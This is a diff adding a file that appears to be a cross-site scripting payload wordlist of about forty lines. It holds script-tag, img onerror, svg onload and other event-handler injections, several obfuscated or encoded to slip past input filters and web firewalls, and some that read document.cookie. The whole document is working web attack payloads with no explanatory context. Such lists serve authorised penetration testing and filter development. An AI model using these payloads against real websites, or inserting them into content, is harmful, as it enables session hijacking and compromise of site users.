@@ -1,0 +1,41 @@
+><script>alert(123)</script>
+><script>alert(123);</script x=
+>"'><script>alert(2);</script>
+>'"><script>alert(2);</script>
+>'><script>alert(2);</script>
+>'>"><script>alert();</script>
+><img/onerror="javascript:alert(1%26%23x000000029;" src=x>
+><imgsrc=x onerror=confirm.onerror=confirm(1)>
+>'"><img src=x onerror=script(2);>
+><img src=x onmouseleave=print()>
+%3E%3Cbody%20onload=javascript:alert(1)%3E
+%3E'><script>alert(2);</script>
+>%0D%0A%0D%0A<x '=foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+>alert(1)</script>
+autofocus ' onfocus='alert(document.domain)'
+><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
+>'><details/open/ontoggle=confirm('XSS')>
+>><marquee loop=1 width=0 onfinish=alert(1)>
+onerror=alert(0);>
+onerror=alert();><script>alert();</script>
+onerror=alert;throw 23;
+onerror="alert('XSS')"
+onerror=”alert(‘XSS’)
+onerror=eval;throw'=alert\x2823\x29';
+onerror=eval;throw'alert\x2845\x29';
+onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
+onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+onfocus=”alert(‘XSS’)
+onfocus=JaVaSCript:alert(123) autofocus
+onload=\"a='alert()';d='XSS ';b='t(d)';c=a+b;console.log(eval(c));
+onload=”alert(‘XSS’)
+onload=prompt`1`>
+onmouseover=”alert(‘XSS’)
+onmouseover=prompt(1)>OnMouseOve
+><s"%2b"cript>alert(document.cookie)</s"%2B"cript>
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+><sVg%2Fonload%3Dalert%281%29+class%3Dikhsan>
+>'>"><svg/onload=alert(document.domain)>
+><tag onxxxx="'a'|alert(1)">
+><tag onxxxx=alert(1)>
